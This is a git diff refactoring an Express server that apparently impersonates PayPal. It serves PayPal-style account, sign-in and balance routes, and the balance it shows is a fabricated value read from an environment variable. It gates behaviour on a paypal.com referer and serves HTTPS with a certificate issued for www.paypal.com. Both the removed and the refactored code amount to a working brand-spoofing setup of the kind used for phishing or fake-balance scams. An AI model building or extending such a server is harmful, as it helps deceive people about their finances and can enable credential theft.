@@ -3,58 +3,27 @@ import fs from 'node:fs'
 import https from 'node:https'
 import cors from 'cors'
 import { config } from 'dotenv'
-import { abs } from './util.js'
+import { routes } from './routes.js'
+import { navigationHandler, igoreErrors } from './middleware.js'
 
 config()
 
 const app = express()
+
 app.use(express.json())
 app.use(cors())
 
 app.use(express.static('./public'))
 
-app.get('/myaccount/summary', (req, res) => {
-  res.sendFile(abs('./pages/index.html'))
-})
+app.use(routes)
+app.use(navigationHandler)
+app.use(igoreErrors)
 
-app.get('/signin', (req, res) => {
-  res.sendFile(abs('./pages/login.html'))
-})
-
-app.get('/api/balance', (req, res) => {
-  res.status(200).json({ balance: process.env.BALANCE })
-})
-
-app.use((req, res) => {
-  const referer = req.get('referer')
-  const fromPaypal = referer && referer.includes('paypal.com')
-
-  if (!fromPaypal) {
-    res.sendFile(abs('./partials/redirect.html'))
-    return
-  }
-
-  let urlQuery = ''
-  const isSignout = req.originalUrl.includes('signout')
-  
-  if (!isSignout) {
-    const originalUrl = `https://${req.get('host')}${req.originalUrl}`
-    const returnUri = encodeURIComponent(originalUrl)
-    urlQuery = `?returnUri=${returnUri}`
-  }
-
-  setTimeout(() => res.redirect(`/signin${urlQuery}`), 1000)
-})
-
-app.use((err, req, res, next) => {
-  res.status(204).end()
-})
-
-const options = {
+const httpsConfig = {
   cert: fs.readFileSync('./www.paypal.com+3.pem'),
   key: fs.readFileSync('./www.paypal.com+3-key.pem'),
 }
 
-https.createServer(options, app).listen(443, () => {
+https.createServer(httpsConfig, app).listen(443, () => {
   console.log('Running')
 })
